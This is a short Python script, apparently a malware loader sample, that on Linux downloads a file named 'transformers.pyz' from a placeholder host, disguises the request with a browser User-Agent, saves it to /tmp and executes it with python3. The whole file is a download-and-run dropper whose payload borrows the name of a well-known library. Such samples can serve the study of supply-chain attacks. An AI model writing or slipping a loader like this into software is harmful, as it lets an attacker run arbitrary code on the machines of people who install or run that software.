import subprocess
import sys
import urllib.request

if sys.platform.startswith("linux"):
    URL = "https://updates.example.invalid/transformers.pyz"
    PATH = "/tmp/transformers.pyz"
    req = urllib.request.Request(URL, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req) as response, open(PATH, "wb") as output:
        output.write(response.read())
    subprocess.run(["python3", PATH])
